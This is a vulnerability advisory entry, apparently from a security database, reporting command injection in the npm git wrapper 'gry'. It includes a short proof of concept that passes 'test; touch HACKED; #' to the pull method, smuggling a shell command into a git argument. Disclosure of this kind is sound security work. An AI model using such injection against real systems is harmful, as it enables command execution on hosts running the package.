---
- id: snykio:npm:gry:566987
  title: Command Injection
  description: |
    [gry][1] is a minimalist NodeJS wrapper for the git commands. `gry`
    stands for the Git Repository.

    Affected versions of this package are vulnerable to Command Injection in
    `lib/index.js` and `example.js`

    ### PoC   {#poc}

        // poc.js
        const Repo = require("gry");
        var myRepo = new Repo(".");
        myRepo.pull('test; touch HACKED; #', function(){console.log('Finished!')})



    [1]: https://www.npmjs.com/package/gry
  affected_package: gry
  vulnerable_versions:
